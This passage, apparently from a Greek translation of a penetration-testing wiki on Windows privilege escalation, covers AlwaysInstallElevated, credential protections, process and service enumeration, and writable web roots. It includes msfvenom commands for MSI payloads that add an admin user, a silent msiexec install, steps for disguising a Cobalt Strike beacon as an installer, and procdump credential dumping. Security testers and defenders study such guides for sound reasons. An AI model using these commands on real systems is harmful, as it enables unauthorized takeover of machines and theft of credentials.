Ελέγξτε την πραγματική πολιτική του DC για [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) και [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), τα ACL του αντικειμένου για την relayed ταυτότητα και τα επίπεδα authentication και impersonation της επιλεγμένης κλάσης COM. Ο τύπος σύνδεσης του caller και το πλαίσιο διαπιστευτηρίων έχουν σημασία: μια περίοδος λειτουργίας WinRM μπορεί να συμπεριφέρεται διαφορετικά από μια διαδραστική σύνδεση ή μια σύνδεση new-credentials. Η δρομολόγηση firewall/OXID και οι εγκατεστημένες ενημερώσεις μπορούν επίσης να αλλάξουν το αποτέλεσμα. Αντιμετωπίστε μια επιτρεπτική πολιτική ή ένα ACL που ταιριάζει ως υποψήφιο για έλεγχο· η παθητική απαρίθμηση δεν πρέπει να προκαλεί COM coercion, relay authentication ή εγγραφές στον κατάλογο. Ένα shadow credential λογαριασμού υπολογιστή μπορεί να οδηγήσει σε ticket υπολογιστή και, μόνο αν αυτός ο λογαριασμός έχει τα απαιτούμενα δικαιώματα directory replication, σε ξεχωριστή διαδρομή DCSync.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Αν** αυτά τα 2 κλειδιά μητρώου είναι **ενεργοποιημένα** (τιμή **0x1**), τότε χρήστες οποιουδήποτε επιπέδου προνομίων μπορούν να **εγκαταστήσουν** (εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Payloads του Metasploit

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Αν έχετε μια συνεδρία meterpreter, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε στον τρέχοντα κατάλογο ένα δυαδικό αρχείο Windows MSI για κλιμάκωση προνομίων. Αυτό το script δημιουργεί ένα προμεταγλωττισμένο MSI installer που ζητά την προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε πρόσβαση GIU):

```
Write-UserAddMSI
```

Εκτελέστε απλώς το δυαδικό αρχείο που δημιουργήθηκε για να κλιμακώσετε τα προνόμια.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να τυλίξετε ένα αρχείο "**.bat**" αν θέλετε **απλώς** να **εκτελέσετε** **γραμμές εντολών**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Δημιουργία MSI με WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Δημιουργία MSI με Visual Studio

- **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε ένα όνομα στο project, όπως **AlwaysPrivesc**, χρησιμοποιήστε το **`C:\privesc`** ως τοποθεσία, επιλέξτε **place solution and project in the same directory** και κάντε κλικ στο **Create**.
- Κάντε κλικ στο **Next** μέχρι να φτάσετε στο βήμα 3 από τα 4 (επιλογή αρχείων για συμπερίληψη). Κάντε κλικ στο **Add** και επιλέξτε το payload Beacon που μόλις δημιουργήσατε. Έπειτα, κάντε κλικ στο **Finish**.
- Επιλέξτε το project **AlwaysPrivesc** στο **Solution Explorer** και, στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
  - Μπορείτε να αλλάξετε και άλλες ιδιότητες, όπως τα **Author** και **Manufacturer**, ώστε η εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Έτσι, το payload Beacon θα εκτελείται μόλις ξεκινήσει το πρόγραμμα εγκατάστασης.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **δημιουργήστε το**.
  - Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### Εγκατάσταση MSI

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Ρυθμίσεις ελέγχου

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, γι’ αυτό πρέπει να δώσετε προσοχή

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Το Windows Event Forwarding: έχει ενδιαφέρον να γνωρίζουμε πού αποστέλλονται τα logs.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης τοπικού Administrator**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** στους υπολογιστές που είναι συνδεδεμένοι σε domain. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες στους οποίους έχουν εκχωρηθεί επαρκή δικαιώματα μέσω ACLs, ώστε να μπορούν να βλέπουν τους κωδικούς πρόσβασης τοπικού admin, εφόσον είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Αν είναι ενεργό, οι **κωδικοί πρόσβασης σε απλό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες για το WDigest σε αυτήν τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Προστασία LSA

Από τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για την Local Security Authority (LSA), ώστε να **αποκλείει** προσπάθειες μη έμπιστων διεργασιών να **διαβάσουν τη μνήμη της** ή να εισαγάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για την προστασία LSA εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

Το **Credential Guard** παρουσιάστηκε στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash. [**Περισσότερες πληροφορίες για το Credential Guard είναι διαθέσιμες εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Αποθηκευμένα διαπιστευτήρια

Τα **διαπιστευτήρια τομέα** επαληθεύονται από το **Local Security Authority** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη επαληθεύονται από ένα καταχωρημένο πακέτο ασφαλείας, συνήθως δημιουργούνται διαπιστευτήρια τομέα για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα αποθηκευμένα διαπιστευτήρια εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Χρήστες και ομάδες

### Απαρίθμηση χρηστών και ομάδων

Θα πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε έχει ενδιαφέροντα δικαιώματα.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχα ομάδα, ίσως μπορέσετε να κλιμακώσετε τα προνόμιά σας**. Μάθετε εδώ για τις προνομιούχες ομάδες και πώς να τις καταχραστείτε για να κλιμακώσετε τα προνόμιά σας:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός token

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την ακόλουθη σελίδα για να **μάθετε για ενδιαφέροντα tokens** και πώς να τα καταχραστείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Sessions

```bash
qwinsta
klist sessions
```

### Προσωπικοί φάκελοι

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Πολιτική κωδικών πρόσβασης

```bash
net accounts
```

### Λήψη του περιεχομένου του προχείρου

```bash
powershell -command "Get-Clipboard"
```

## Εκτελούμενες διεργασίες

### Δικαιώματα αρχείων και φακέλων

Πρώτα απ’ όλα, κατά την καταχώριση των διεργασιών, **ελέγξτε αν υπάρχουν κωδικοί πρόσβασης στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο εκτελούμενο binary** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του binary, ώστε να εκμεταλλευτείτε πιθανές επιθέσεις [**DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Να ελέγχετε πάντα αν εκτελούνται [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), καθώς θα μπορούσατε να τους εκμεταλλευτείτε για κλιμάκωση προνομίων.

Ένας debugger listener μπορεί να είναι βραχύβιος, επομένως η απουσία του από ένα παθητικό στιγμιότυπο θυρών δεν αποδεικνύει ότι δεν ήταν ποτέ εκτεθειμένος. Συσχετίστε κάθε listener που εντοπίζετε με το PID του, τον κάτοχο της διεργασίας και τη δυνατότητα πρόσβασης σε αυτόν από τον χρήστη με χαμηλότερα προνόμια· το όνομα μιας εφαρμογής ή μια debug flag από μόνη της δεν τεκμηριώνει εκτέλεση κώδικα μεταξύ χρηστών. Διατηρήστε τη συνήθη απαρίθμηση παθητική, αντί να στέλνετε εντολές debugger.

**Έλεγχος δικαιωμάτων των εκτελέσιμων αρχείων των διεργασιών**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Έλεγχος δικαιωμάτων των φακέλων των δυαδικών αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Κατάλογοι dynamic preprocessor του Snort

Το Snort 2 μπορεί να φορτώνει shared libraries από έναν κατάλογο `dynamicpreprocessor directory` που δηλώνεται στη διαμόρφωση η οποία επιλέγεται με `snort.exe -c <config>`. Για μια scheduled task ή υπηρεσία που εκτελεί το Snort με διαφορετικό λογαριασμό, ελέγξτε τη συγκεκριμένη διαμόρφωση και τα ACL του δηλωμένου καταλόγου modules. Αν το token σας μπορεί να δημιουργεί αρχεία εκεί, η διαδρομή αξίζει να διερευνηθεί ως πιθανό σημείο εκτέλεσης κώδικα την επόμενη φορά που η task ή η υπηρεσία θα φορτώσει modules. Επαληθεύστε τα πραγματικά δικαιώματα του λογαριασμού εκτέλεσης, την ενεργή διαμόρφωση, τη συμβατότητα των modules και τυχόν περιορισμούς deny ή share· το ότι ένας κατάλογος είναι εγγράψιμος δεν αρκεί για να αποδειχθεί privilege escalation. Η [τεκμηρίωση του Snort για dynamic preprocessor](https://www.snort.org/documents/dpx-readme) περιγράφει τη φόρτωση modules κατά τον χρόνο εκτέλεσης.

### Προνομιούχα web service με εγγράψιμο document root

Σε μια εγκατάσταση Apache για Windows, συγκρίνετε τη διαδρομή του εκτελέσιμου αρχείου της υπηρεσίας και τον λογαριασμό εκτέλεσής της με το `DocumentRoot` στο ενεργό `httpd.conf`. Σε μια τυπική διάταξη XAMPP, ελέγξτε το `C:\xampp\apache\conf\httpd.conf` και τα ACL του διαμορφωμένου document root, που συχνά είναι το `C:\xampp\htdocs`. Αν ένας χρήστης με λιγότερα προνόμια μπορεί να δημιουργεί αρχεία σε αυτόν τον κατάλογο ενώ το Apache εκτελείται ως `LocalSystem`, η εκτέλεση κώδικα από την πλευρά του server ενδέχεται να υπερβεί το όριο προνομίων του host. Επιβεβαιώστε ότι η υπηρεσία εκτελείται, ότι σερβίρεται η ακριβής διαδρομή και ότι ένας handler από την πλευρά του server επεξεργάζεται τον τύπο αρχείου· ένας εγγράψιμος κατάλογος από μόνος του αποδεικνύει μόνο τη δυνατότητα δημιουργίας αρχείων. Ελέγξτε τα ACL χωρίς να γράψετε δοκιμαστικό αρχείο:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Για μια συμβατική εγκατάσταση WAMP, η υπηρεσία μπορεί να δείχνει σε ένα αρχείο `C:\wamp64\bin\apache\apache*\bin\httpd.exe` με έκδοση (ή σε `C:\wamp\...` για διάταξη 32-bit), με τη διαμόρφωση δίπλα του, στο `conf\httpd.conf`, και προεπιλεγμένο root `C:\wamp64\www` ή `C:\wamp\www`. Ελέγξτε μαζί την ακριβή εικόνα υπηρεσίας, την ταυτότητα με την οποία εκτελείται, το ενεργό `DocumentRoot` (συμπεριλαμβανομένης της επέκτασης του `${INSTALL_DIR}` και των παρακάμψεων virtual host) και τα ACL του root. Ένας εγγράψιμος κατάλογος WAMP δεν αποδεικνύει ότι το Apache εκτελείται ως `SYSTEM` ή εκτελεί το υποβληθέν αρχείο. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Εγγράψιμο root IIS και ταυτότητα δικτύου του application pool

Για το IIS, αντιστοιχίστε έναν εγγράψιμο φυσικό κατάλογο σε έναν **ενεργό ιστότοπο/εφαρμογή** στο `applicationHost.config` και, στη συνέχεια, εντοπίστε το διαμορφωμένο pool και τον server-side handler. Κώδικας σε έναν κατάλογο που εξυπηρετείται εκτελείται ως το pool μόνο αν το IIS επεξεργάζεται αυτόν τον τύπο αρχείου και η διαδρομή είναι προσβάσιμη. Ελέγξτε την αποτελεσματική πρόσβαση του τρέχοντος χρήστη για δημιουργία αρχείων, την κατάσταση εκτέλεσης του ιστότοπου, τον handler και τις παρακάμψεις ανά διαδρομή, πριν θεωρήσετε έναν εγγράψιμο κατάλογο ως εκτέλεση κώδικα.

Η δυναμική μεταγλώττιση ASP.NET δημιουργεί μια ξεχωριστή διαδρομή προς έλεγχο: τα παραγόμενα αρχεία στον κατάλογο μεταγλώττισης της εφαρμογής. Η προεπιλεγμένη τοποθεσία είναι ένας κατάλογος `Temporary ASP.NET Files` κάτω από τη σχετική εγκατάσταση του .NET Framework, αλλά το `<compilation tempDirectory>` της εφαρμογής μπορεί να την αλλάξει. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) and [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Αν ένα token με χαμηλότερα προνόμια μπορεί να τροποποιήσει τον παραγόμενο πηγαίο κώδικα στην **προκειμένη** cache εφαρμογής, εξακριβώστε αν η εφαρμογή τον μεταγλωττίζει ξανά υπό μια πιο προνομιούχα [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ένα ACL αρχείου ή καταλόγου από μόνο του δεν αποδεικνύει εκτέλεση κώδικα: συσχετίστε την cache με την ενεργή εφαρμογή, το αποτελεσματικό token και τα ACL, τις ρυθμίσεις μεταγλώττισης, την ταυτότητα της διεργασίας και τον χρονισμό οποιασδήποτε επαναμεταγλώττισης. Χρησιμοποιήστε μόνο έλεγχο μεταδεδομένων για ανάγνωση· μην ενεργοποιείτε τη μεταγλώττιση και μην τροποποιείτε αρχεία cache κατά την απαρίθμηση.

Ένα IIS pool διαμορφωμένο ως `ApplicationPoolIdentity` ή `NetworkService` συνήθως πραγματοποιεί έλεγχο ταυτότητας σε πόρους domain ως **λογαριασμός του υπολογιστή-host**, παρόλο που το τοπικό του token μπορεί να έχει χαμηλά προνόμια. Το `LocalSystem` έχει ήδη υψηλά τοπικά προνόμια και χρησιμοποιεί επίσης τον λογαριασμό του υπολογιστή στο δίκτυο· το `LocalService` συνήθως χρησιμοποιεί ανώνυμα διαπιστευτήρια δικτύου. Ένα pool `SpecificUser` χρησιμοποιεί τον λογαριασμό που έχει διαμορφωθεί για αυτό. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) and [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Μια παράλειψη στη ρύθμιση ταυτότητας μπορεί να σημαίνει ότι κληρονομούνται οι προεπιλογές του pool, οι οποίες διαφέρουν ανάμεσα στις γενιές IIS, γι’ αυτό εξακριβώστε την ενεργή διαμόρφωση αντί να κάνετε εικασίες με βάση το όνομα του pool. Αν η εκτέλεση κώδικα φτάσει σε pool με ταυτότητα δικτύου λογαριασμού υπολογιστή, αξιολογήστε τα δικαιώματα καταλόγου του **συγκεκριμένου υπολογιστή**. Το [DCSync](../active-directory-methodology/dcsync.md) απαιτεί δικαιώματα αναπαραγωγής στο naming context του domain· ένα ticket λογαριασμού υπολογιστή ή ένας ρόλος host από μόνος του δεν τα αποδεικνύει. Η παθητική απαρίθμηση πρέπει να ελέγχει τη διαμόρφωση και τα ACL χωρίς να ανεβάζει αρχείο, να πραγματοποιεί έλεγχο ταυτότητας μέσω δικτύου ή να ζητά tickets.

Για έναν αναγνώσιμο ASP.NET handler που εκκινεί βοηθητική διεργασία, ακολουθήστε κάθε τιμή που προέρχεται από το request μέσα από τον έλεγχο ταυτότητας, την αποκρυπτογράφηση, την επικύρωση και τη δημιουργία της εντολής. Ένας handler που συνενώνει ένα αποκωδικοποιημένο token σε `ProcessStartInfo("cmd", "/c ...")` μπορεί να επιτρέψει σε μεταχαρακτήρες του shell να αλλάξουν την εντολή· [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Εξακριβώστε ότι ένας μη έμπιστος καλών μπορεί πράγματι να επηρεάσει την αποκωδικοποιημένη τιμή και να φτάσει στον handler, και στη συνέχεια εξακριβώστε την ενεργή ταυτότητα του application pool ή την ταυτότητα μέσω impersonation, καθώς και την ταυτότητα της θυγατρικής διεργασίας. Μια αναγνώσιμη γραμμή πηγαίου κώδικα, ένας listener στο localhost ή μια αδυναμία στη μορφή του token από μόνα τους δεν αποδεικνύουν εκτέλεση προνομιούχων εντολών. Ελέγξτε τον πηγαίο κώδικα και τη διαμόρφωση του pool χωρίς να στέλνετε πλαστά requests ή να εκτελείτε τη βοηθητική διεργασία κατά την παθητική απαρίθμηση.

Για μια υπηρεσία PHP σε Windows, μια διαδρομή που ελέγχεται από το request και περνά σε [`include` or `require`](https://www.php.net/manual/en/function.include.php) μπορεί να αξιολογήσει ένα αρχείο PHP εγγράψιμο από χρήστη χαμηλότερων προνομίων υπό την ταυτότητα του worker. Επιβεβαιώστε ότι το request μπορεί να φτάσει σε αυτήν την εντολή, ότι η επιλυμένη διαδρομή ονομάζει ένα αρχείο που ο χρήστης χαμηλότερων προνομίων μπορεί να τροποποιήσει και ο worker να διαβάσει, ότι οι εφαρμοστέοι περιορισμοί διαδρομών της PHP επιτρέπουν το include και ότι ο worker εκτελείται πράγματι με υψηλότερα προνόμια. Ένας listener loopback ή ένα εγγράψιμο αρχείο από μόνο του δεν αποδεικνύει αυτήν την αλυσίδα· ελέγξτε τον πηγαίο κώδικα, την ταυτότητα της υπηρεσίας και τα ACL αρχείων, χωρίς να καλέσετε το endpoint κατά την παθητική απαρίθμηση.

### Εξόρυξη κωδικών πρόσβασης από τη μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας που εκτελείται χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως το FTP έχουν τα **διαπιστευτήρια σε απλό κείμενο στη μνήμη**· δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα διαπιστευτήρια.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Μη ασφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM ενδέχεται να επιτρέπουν σε έναν χρήστη να εκκινήσει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: «Windows Help and Support» (Windows + F1), αναζητήστε «command prompt» και κάντε κλικ στο «Click to open Command Prompt»

### Εισαγωγή αρχείων project με αυξημένα δικαιώματα

Μια εφαρμογή που ανοίγει αυτόματα projects από έναν κατάλογο drop στον οποίο μπορεί να γράψει ένας χρήστης με χαμηλότερα δικαιώματα περνά ένα όριο εμπιστοσύνης εισόδου υπό τον λογαριασμό της εφαρμογής εισαγωγής. Ελέγξτε την **ακριβή διαδρομή με δικαιώματα εγγραφής**, τη διεργασία ή την εργασία που την ανοίγει, την πραγματική ταυτότητα εκτέλεσής της και την έκδοση του parser. Ένα [ιστορικό ζήτημα ανοίγματος/επαναφοράς project στο Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) επέτρεπε εξωτερικές οντότητες XML στα metadata του project· μια οντότητα δικτύου στα Windows θα μπορούσε να προκαλέσει έλεγχο ταυτότητας από τον λογαριασμό εισαγωγής, εφόσον το επιτρέπουν η [πολιτική εξερχόμενων συνδέσεων SMB και NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Αυτό αποτελεί ένδειξη πιθανής έκθεσης διαπιστευτηρίων, όχι άμεση πρόσβαση διαχειριστή: η απόκριση πρέπει να είναι αξιοποιήσιμη μέσω ξεχωριστής εξουσιοδοτημένης ή ευάλωτης διαδρομής, ενώ οι τρέχουσες εκδόσεις πρέπει να αξιολογούνται με βάση την πραγματική κατάσταση ενημερώσεών τους. Μην ανοίγετε ένα κατασκευασμένο project κατά την παθητική απαρίθμηση· ελέγξτε τη ροή εισαγωγής και τα ACL.

## Υπηρεσίες

Το δικαίωμα [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) στο αντικείμενο Service Control Manager (SCM) είναι ξεχωριστό από τα δικαιώματα σε μια υπάρχουσα υπηρεσία. Ένα επιτυχές, μόνο για ανάγνωση αίτημα πρόσβασης [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) για αυτό το δικαίωμα αποτελεί ένδειξη για έλεγχο, όχι απόδειξη ότι μπορεί να εκτελεστεί μια νέα υπηρεσία. Η [`CreateService` επιστρέφει ένα handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) με τα δικαιώματα πρόσβασης υπηρεσίας που ζητήθηκαν κατά τη δημιουργία· το μεταγενέστερο εκ νέου άνοιγμα της υπηρεσίας εκτελεί ξεχωριστό έλεγχο πρόσβασης και μπορεί να αποτύχει, ακόμη κι αν μπορούσε να χρησιμοποιηθεί το αρχικό handle. Επαληθεύστε ξεχωριστά το πραγματικό τοπικό ή απομακρυσμένο token, τα δικαιώματα που έχουν δοθεί στο handle, τον λογαριασμό υπηρεσίας, την πολιτική εκκίνησης και τη διαδρομή του εκτελέσιμου αρχείου. Μη δημιουργείτε και μην εκκινείτε υπηρεσία κατά την παθητική απαρίθμηση.

Για μια απομακρυσμένη διαδρομή εγκατάστασης υπηρεσίας, συσχετίστε αυτά τα δικαιώματα SCM με ένα share στον στόχο στο οποίο μπορεί να γράψει το **ίδιο network logon**, το υποκείμενο NTFS ACL του και μια τοπική διαδρομή εκτελέσιμου αρχείου που μπορεί να εκτελέσει ο λογαριασμός υπηρεσίας. Ένας λογαριασμός χωρίς δικαιώματα διαχειριστή μπορεί να περάσει αυτό το όριο, εάν υπάρχουν ασυνήθιστα ευρεία δικαιώματα SCM και η διαδρομή τοποθέτησης αρχείων· η ύπαρξη administrative share δεν αποτελεί απαραίτητη προϋπόθεση. Η πρόσβαση εγγραφής σε share από μόνη της ή μια ένδειξη δικαιώματος δημιουργίας υπηρεσίας στο SCM από μόνη της δεν αποδεικνύει ότι μπορεί να εκκινηθεί η νέα υπηρεσία με υψηλότερη ταυτότητα.

Μια υπάρχουσα υπηρεσία μπορεί να καλέσει ένα βοηθητικό εκτελέσιμο αρχείο κατά την εκκίνηση, τον τερματισμό ή κάποιο άλλο συμβάν κύκλου ζωής, ακόμη κι όταν αυτό απουσιάζει από το `ImagePath` της. Εάν το όνομα του βοηθητικού αρχείου επιλύεται σε κατάλογο στον οποίο μπορεί να γράψει χρήστης με χαμηλότερα δικαιώματα και η υπηρεσία εκτελείται με υψηλότερη ταυτότητα, ένα αρχείο βοηθητικού προγράμματος που λείπει αποτελεί υποψήφιο για αντικατάσταση υπό προϋποθέσεις. Επιβεβαιώστε τον **πραγματικό κώδικα της υπηρεσίας ή την τεκμηριωμένη κλήση του βοηθητικού προγράμματος**, την επιλυμένη διαδρομή του εκτελέσιμου αρχείου και τη σειρά αναζήτησης, τα δικαιώματα δημιουργίας καταλόγου, την ταυτότητα της υπηρεσίας και την ύπαρξη διαθέσιμου trigger κύκλου ζωής. Ένας κατάλογος υπηρεσίας με δικαιώματα εγγραφής ή ένα αρχείο που λείπει από μόνο του δεν αποδεικνύει ότι η υπηρεσία φορτώνει αυτό το αρχείο· ο παθητικός έλεγχος δεν πρέπει να εκκινεί ή να διακόπτει την υπηρεσία.

Για μια υπάρχουσα υπηρεσία, το [`SERVICE_START` επιτρέπει τον ορισμό ορισμάτων στο `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)· είναι διαφορετικό από το [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Ελέγξτε τον κώδικα της υπηρεσίας ή την τεκμηριωμένη διεπαφή της προτού θεωρήσετε ότι το δικαίωμα εκκίνησης αποτελεί κάτι περισσότερο από δικαίωμα ελέγχου. Αν χρησιμοποιεί όρισμα που επιλέγει ο καλών ως διαδρομή αρχείου καταγραφής ή εξαγωγής, επαληθεύστε την ταυτότητα της υπηρεσίας, την ακριβή ροή από το όρισμα στην εγγραφή, τους περιορισμούς διαδρομής και τα δικαιώματα του **αρχείου που δημιουργείται**. Μια εγγραφή σε προστατευμένο κατάλογο μπορεί να οδηγήσει σε κλιμάκωση μόνο εφόσον υπάρχει ξεχωριστή προνομιούχα διεργασία που χρησιμοποιεί ή φορτώνει αυτό το αρχείο· ένα αρχείο καταγραφής με δυνατότητα εγγραφής ή το δικαίωμα εκκίνησης από μόνο του δεν αρκεί. Η παθητική απογραφή δεν πρέπει να εκκινεί την υπηρεσία ή να δημιουργεί δοκιμαστικό αρχείο.

